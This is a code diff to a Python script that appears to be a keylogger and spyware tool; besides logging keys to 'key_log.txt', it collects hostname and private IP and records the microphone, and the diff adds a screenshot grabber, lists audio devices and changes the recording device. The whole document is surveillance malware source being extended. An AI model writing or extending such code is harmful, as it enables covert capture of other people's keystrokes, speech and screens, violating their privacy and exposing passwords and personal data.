@@ -29,6 +29,7 @@ keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboardinfo.txt"  # TO-DO
 audio_information = "audio.wav"
+sc_information = "screenshot.png"
 
 microphone_time = 10
 
@@ -103,6 +104,11 @@ def computer_information():
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddr + '\n')
 
+        f.write("Available audio devices:\n")
+        for i, device in enumerate(sd.query_devices()):
+            f.write(
+                f"{i}: {device['name']} | Inputs: {device['max_input_channels']} | Outputs: {device['max_output_channels']}\n")
+
 
 computer_information()
 
@@ -113,7 +119,7 @@ def microphone():
     fs = 44100
     seconds = microphone_time
 
-    sd.default.device = (0, None)
+    sd.default.device = (2, None)
 
     print("[*] Recording microphone...")
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
@@ -124,6 +130,14 @@ def microphone():
 
 
 microphone()
+
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + sc_information)
+
+
+screenshot()
 
 count = 0
 keys = []
